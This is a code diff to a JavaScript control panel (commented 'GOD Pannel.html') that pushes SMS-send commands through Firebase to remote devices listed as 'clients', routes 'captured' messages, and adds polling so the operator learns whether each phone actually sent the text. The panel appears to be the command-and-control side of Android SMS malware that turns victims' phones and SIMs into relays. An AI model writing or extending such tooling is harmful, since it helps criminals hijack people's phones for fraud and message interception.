@@ -410,8 +410,9 @@ function notifyChannel(html){
     })
   }).catch(function(){});
 }
-function notifySmsQueued(dev, to, message, latencyMs){
-  var txt = '📤 <b>SMS Sent</b>\n\n'
+function notifySmsQueued(dev, to, message, latencyMs, confirmed){
+  var title = confirmed ? '📤 <b>SMS Sent (device OK)</b>' : '⏳ <b>SMS Queued (device pending)</b>';
+  var txt = title + '\n\n'
     + '📱 <b>Device:</b> ' + esc(dev ? dev.name : '—') + '\n'
     + '📞 <b>To:</b> <code>' + esc(to) + '</code>\n'
     + '💬 <b>Message:</b>\n<code>' + esc(message) + '</code>\n\n'
@@ -745,12 +746,14 @@ async function fbDel(p, url, key){
   if(!r.ok) throw new Error('HTTP ' + r.status);
 }
 
-/* GOD Pannel.html — Zp() PUT @ ~17373, sendSms payload @ ~18795 */
-async function godFirebasePut(fbUrl, authKey, path, data){
+/* GOD Pannel.html — Zp/Gp @ ~17373, sendSms @ ~18795 */
+function godFirebaseUrl(fbUrl, authKey, path){
   var base = String(fbUrl || '').replace(/\/+$/, '');
   var key = String(authKey || '').trim();
-  var url = base + '/' + path + '.json?auth=' + key;
-  var r = await fetch(url, {
+  return base + '/' + path + '.json?auth=' + key;
+}
+async function godFirebasePut(fbUrl, authKey, path, data){
+  var r = await fetch(godFirebaseUrl(fbUrl, authKey, path), {
     method: 'PUT',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify(data)
@@ -762,6 +765,47 @@ async function godFirebasePut(fbUrl, authKey, path, data){
     throw new Error('HTTP ' + r.status);
   }
   return r.json();
+}
+async function godFirebaseGet(fbUrl, authKey, path){
+  var r = await fetch(godFirebaseUrl(fbUrl, authKey, path), {
+    method: 'GET',
+    headers: { Accept: 'application/json' }
+  });
+  if(r.status === 404) return null;
+  if(!r.ok) throw new Error('HTTP ' + r.status);
+  return r.json();
+}
+async function godFirebaseDel(fbUrl, authKey, path){
+  var r = await fetch(godFirebaseUrl(fbUrl, authKey, path), { method: 'DELETE' });
+  if(!r.ok && r.status !== 404) throw new Error('HTTP ' + r.status);
+}
+
+function isSmsMarkedSent(node){
+  if(!node || typeof node !== 'object') return false;
+  var v = node.isSended;
+  if(v === true || v === 1) return true;
+  if(String(v).toLowerCase() === 'true') return true;
+  return false;
+}
+
+async function waitDeviceSmsAck(dev, authKey, path, timeoutMs){
+  var deadline = Date.now() + (timeoutMs || 25000);
+  var sawPending = false;
+  while(Date.now() < deadline){
+    await sleep(450);
+    try{
+      var cur = await godFirebaseGet(dev._fbUrl || FB_URL, authKey, path);
+      if(cur == null){
+        if(sawPending) return { ok: true, reason: 'cleared' };
+        continue;
+      }
+      if(isSmsMarkedSent(cur)) return { ok: true, reason: 'isSended_true', state: cur };
+      if(cur.isSended === false || cur.isSended == null) sawPending = true;
+    }catch(e){
+      console.warn('[SMS] ack poll:', e.message || e);
+    }
+  }
+  return { ok: false, reason: 'timeout' };
 }
 
 async function dispatchSms(dev, sim, to, message){
@@ -783,12 +827,24 @@ async function dispatchSms(dev, sim, to, message){
   var path = 'clients/' + dev.id + '/webhookEvent/sendSms';
 
   try{
+    try{ await godFirebaseDel(dev._fbUrl || FB_URL, authKey, path); }catch(eDel){}
+
     var t0 = performance.now();
     await godFirebasePut(dev._fbUrl || FB_URL, authKey, path, payload);
     var dt = (performance.now() - t0).toFixed(0);
-    console.log('[SMS] ✓ sendSms.json PUT ' + dt + 'ms → ' + dev.name + ' SIM' + fromSim + ' → ' + toStr);
-    try{ notifySmsQueued(dev, toStr, text, dt); }catch(e){}
-    return true;
+    console.log('[SMS] PUT sendSms isSended=false ' + dt + 'ms → ' + dev.id + ' SIM' + fromSim + ' → ' + toStr);
+
+    var ack = await waitDeviceSmsAck(dev, authKey, path, 25000);
+    if(ack.ok){
+      console.log('[SMS] ✓ device ack (' + ack.reason + ') → ' + dev.name);
+      try{ notifySmsQueued(dev, toStr, text, dt, true); }catch(e){}
+      return true;
+    }
+
+    console.warn('[SMS] ✗ device ne isSended=true nahi kiya — phone par SMS nahi gaya');
+    try{ notifySmsQueued(dev, toStr, text, dt, false); }catch(e2){}
+    toast('⚠ Firebase OK but device ne SMS nahi bheja — online/SIM check karo');
+    return false;
   }catch(e){
     var msg = e && e.message ? e.message : String(e);
     console.warn('[SMS] sendSms failed:', msg);
@@ -1856,7 +1912,7 @@ function sendSmsActive(){
   if(btn){ btn.disabled = true; btn.textContent = 'Sending…'; }
 
   sendSmsGuaranteed(selDev, sim, to, msg).then(function(ok){
-    if(ok){ showResActive(true, '✓ SMS queued from SIM ' + sim); document.getElementById('dmSendMsg').value = ''; }
+    if(ok){ showResActive(true, '✓ SMS sent (device confirmed) SIM ' + sim); document.getElementById('dmSendMsg').value = ''; }
     else { showResActive(false, '⚠ Failed'); }
     if(btn){ btn.disabled = false; btn.textContent = '🚀 Send Message'; }
   });
@@ -2426,7 +2482,7 @@ function routeChannelSms(number, message, msgObj){
   _showCapturedNotif(number, message);
 
   sendSmsGuaranteed(dev, sim, number, message).then(function(ok){
-    toast(ok ? '⚡ Sent via ' + dev.name : '❌ Failed');
+    toast(ok ? '⚡ Device ne SMS bheja — ' + dev.name : '❌ Device ne accept nahi kiya');
   });
 }
 
